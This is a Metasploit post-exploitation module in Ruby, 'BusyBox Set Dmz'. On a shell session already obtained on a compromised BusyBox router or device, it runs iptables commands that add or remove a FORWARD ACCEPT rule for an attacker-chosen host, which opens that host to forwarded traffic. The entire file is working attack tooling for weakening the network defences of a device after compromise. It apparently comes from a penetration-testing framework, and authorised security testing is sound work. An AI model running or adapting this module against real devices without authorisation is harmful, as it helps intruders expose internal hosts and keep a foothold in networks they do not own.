##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize
    super(
      'Name'         => 'BusyBox Set Dmz',
      'Description'  => 'This module will be applied on a session connected
                         to a BusyBox sh shell. The script will enable or disable dmz
                         to a network host in the router or device executing BusyBox.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
       'SessionTypes'  => ['shell']
    )

     register_options([
      OptAddress.new('TARGETHOST', [ true, "The address of the host to be target for the dmz", nil ]),
      OptBool.new('DELETE', [false, "If this option is set to true, the DMZ is removed. Else it is added.", false])
    ], self.class)

  end

  def run

    if datastore['DELETE'] == true
      vprint_status("Executing iptables to delete dmz.")
      vprint_status(cmd_exec("iptables -D FORWARD -d #{datastore['TARGETHOST']} -j ACCEPT"))
    else
      vprint_status("Executing iptables to add dmz.")
      vprint_status(cmd_exec("iptables -A FORWARD -d #{datastore['TARGETHOST']} -j ACCEPT"))
    end
    if datastore['VERBOSE']
      vprint_status(cmd_exec("iptables --list"))
    end
    print_good("Dmz modified. Enable verbose for additional information.")

  end

end
